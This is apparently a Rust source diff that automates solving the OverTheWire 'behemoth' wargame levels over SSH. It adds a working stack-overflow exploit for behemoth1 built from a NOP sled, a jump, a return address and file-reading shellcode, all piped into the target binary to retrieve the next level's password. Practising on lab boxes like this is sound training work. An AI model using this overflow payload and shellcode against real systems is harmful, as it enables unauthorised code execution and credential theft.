@@ -9,7 +9,8 @@ const PORT: usize = 2221;
 fn main() -> Result<()> {
 
     let pass_1 = behemoth0("behemoth0")?;
-    let _pass_2 = behemoth1(&pass_1)?;
+    let pass_2 = behemoth1(&pass_1)?;
+    let _pass_3 = behemoth2(&pass_2)?;
 
     Ok(())
 }
@@ -29,7 +30,8 @@ fn ssh_session(username: &str, password: &str) -> Result<Session> {
 
 fn read_until(channel: &mut Channel, finished_token: &str) -> Result<String> {
     let mut result = String::new();
-    while !result.contains(finished_token) {
+    let token_hex = hex::encode(finished_token);
+    while !result.contains(&token_hex) {
 
         let mut full_buf = Vec::new();
         let mut buf = [0u8; 1024];
@@ -42,11 +44,11 @@ fn read_until(channel: &mut Channel, finished_token: &str) -> Result<String> {
             }
         }
 
-        let decoded = std::str::from_utf8(&full_buf)?;
-        result += decoded;
-        //println!("{decoded}");
+        result += &hex::encode(&full_buf);
     }
-    Ok(result)
+    let raw = hex::decode(result).unwrap();
+    let decoded = String::from_utf8_lossy(&raw);
+    Ok(decoded.into())
 }
 
 fn write_line(channel: &mut Channel, line: &str) -> Result<()> {
@@ -99,6 +101,11 @@ fn behemoth0(password: &str) -> Result<String> {
 }
 
 fn behemoth1(password: &str) -> Result<String> {
+    // behemoth1 is a basic stack overflow. however updates to the box (linux version, libc etc) prevent some old methods from working
+    // the stack is executable: approach is fill it with nops, end with a short jump, then the overflow ret register, then shell code,
+    // so execution will be hit overflow, jump back to beginning of variable stack, follow nops, jump over overflow and start shell code.
+    // shellcode used just reads the target file, and is sourced from here: https://shell-storm.org/shellcode/files/shellcode-73.html
+
     let session = ssh_session("behemoth1", password)?;
 
     let mut channel = session.channel_session()?;
@@ -106,6 +113,49 @@ fn behemoth1(password: &str) -> Result<String> {
     channel.shell()?;
 
     let _ = read_until(&mut channel, "behemoth1@gibson:~$ ");
+
+    let nop_sled: Vec<u8> = vec![0x90; 69]; // the offset is 71 to the ret address. 71 - length of jmp is 69 (nice)
+    let jmp_esp = hex::decode("eb04").unwrap(); // jmp 6 (4 + length of instruction, eb 04)
+    let var_adr = hex::decode("01d5ffff").unwrap(); // 0xffffd501, approximate location in nop sled
+    let file_read_shellcode = hex::decode("31C031DB31C931D2EB325BB00531C9CD8089C6EB06B00131DBCD8089F3B00383EC018D0C24B201CD8031DB39C374E6B004B301B201CD8083C401EBDFE8C9FFFFFF").unwrap(); // https://shell-storm.org/shellcode/files/shellcode-73.html
+    let file_to_read = "/etc/behemoth_pass/behemoth2".as_bytes();
+
+    let mut full_payload: Vec<u8> = Vec::new();
+    full_payload.extend(nop_sled);
+    full_payload.extend(jmp_esp);
+    full_payload.extend(var_adr);
+    full_payload.extend(file_read_shellcode);
+    full_payload.extend(file_to_read);
+
+    let mut encoded = String::new();
+    for b in full_payload {
+        encoded += &format!("\\x{:02x?}", b);
+    }
+
+    let target = "/behemoth/behemoth1";
+    println!("running 'echo -e [payload] | {target}'");
+
+    let cmd = format!("echo -e \"{encoded}\" | {target}");
+    write_line(&mut channel, &cmd)?;
+    
+    println!("reading result");
+
+    let result = read_until(&mut channel, "behemoth1@gibson:~$ ")?;
+    let result: Vec<&str> = result.split("\n").collect();
+    let result = result[result.len()-2].trim();
+    println!("retrieved behemoth1 pass '{result}'\n");
+
+    Ok(result.to_string())
+}
+
+fn behemoth2(password: &str) -> Result<String> {
+    let session = ssh_session("behemoth2", password)?;
+
+    let mut channel = session.channel_session()?;
+    channel.request_pty("xterm", None, Some((80, 24, 0, 0)))?;
+    channel.shell()?;
+
+    let _ = read_until(&mut channel, "behemoth2@gibson:~$ ");
     
     Ok("".into())
 }
